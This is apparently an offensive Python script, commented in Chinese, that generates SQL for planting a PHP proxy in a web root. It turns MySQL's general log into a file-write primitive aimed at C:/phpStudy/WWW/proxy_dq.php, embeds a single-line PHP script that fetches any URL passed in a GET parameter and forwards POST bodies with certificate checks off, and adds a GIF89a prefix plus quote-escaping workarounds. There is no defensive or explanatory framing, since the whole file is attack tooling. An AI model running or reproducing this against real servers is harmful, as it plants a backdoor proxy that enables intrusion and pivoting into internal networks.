#!/usr/bin/env python3
"""gen_proxy_dq.py - 生成全双引号POST代理 (避开general_log单引号转义)"""
body = r'''<?php
$u = $_GET["u"];
if ($u) {
  $ch = curl_init($u);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_TIMEOUT, 25);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents("php://input"));
  }
  $h = array();
  $ct = $_SERVER["CONTENT_TYPE"];
  if ($ct) { $h[] = "Content-Type: " . $ct; }
  curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
  $r = curl_exec($ch);
  $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  http_response_code($code);
  echo $r;
}
?>'''

# 去掉所有换行, 确保单行PHP (SET日志行都在?>之后成HTML)
body_one = " ".join(line.strip() for line in body.split("\n") if line.strip())
# 检查: body里不能有单引号(会被general_log转义破坏)
assert "'" not in body_one.replace("php://input", ""), "body contains single quote!"
print("body ok, len:", len(body_one))

sql = []
sql.append("SET GLOBAL general_log = OFF;")
sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/proxy_dq.php';")
sql.append("SET GLOBAL general_log = ON;")
sql.append("SELECT 'GIF89a%s//'" % body_one.replace("?>", ""))
sql.append("SET GLOBAL general_log = OFF;")
with open('/tmp/proxy_dq.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('proxy_dq.sql ready')
